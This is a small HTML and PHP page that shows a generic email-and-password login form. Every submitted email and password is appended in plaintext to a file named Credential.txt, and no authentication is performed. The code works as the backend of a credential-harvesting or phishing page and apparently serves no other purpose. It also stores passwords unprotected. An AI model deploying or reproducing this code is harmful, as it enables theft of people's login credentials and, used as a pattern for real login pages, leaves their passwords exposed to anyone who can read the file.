<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>form</title>
</head>
<body>
<form action="" method="post">
<input type="email" name="Email" placeholder="Enter Your Email" required><br>
<input type="password" name="Password" placeholder="Enter Your Password " required><br><br>
<button type="submit" value="Submit">Login</button>
  
</form>
  
</body>
</html>
<?php

$Email = $_POST["Email"];
$Password = $_POST["Password"];
$file = fopen('Credential.txt','a');
fwrite($file,"------------------------------");
fwrite($file,"\n");
fwrite($file,"\n");
fwrite($file,"Email : ".$Email."\n");
fwrite($file,"Password : ".$Password."\n");
fwrite($file,"\n");
fwrite($file,"------------------------------");
fwrite($file,"\n");
fclose($file);


?>